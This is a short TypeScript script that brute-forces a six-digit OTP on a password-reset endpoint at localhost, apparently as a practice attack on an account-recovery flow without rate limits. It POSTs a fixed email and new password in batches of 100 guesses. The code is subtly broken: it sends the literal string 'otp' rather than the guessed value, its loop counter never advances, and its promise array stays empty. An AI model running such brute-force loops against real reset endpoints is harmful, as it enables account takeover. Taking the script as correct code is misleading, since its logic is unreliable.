const axios = require('axios');

async function SendRequest(otp : string){
  const axios = require('axios');
let data = JSON.stringify({
  "email": "am3an@gmail.com",
  "otp": "otp",
  "newpassword": "hey i am aman"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://localhost:3000/reset-password/',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};

await axios.request(config)
.then((response:any) => {
  console.log(JSON.stringify(response.data));
})
.catch((error:Error) => {
  console.log(error);
});

}


async function main (){
  for (let i =0 ;i<999999 ; i+100){
    const prms:any =[];
    for (let j=0; j<100; j++){
      SendRequest((i+j).toString());
    }
    await Promise.all(prms);
  }
}

main();

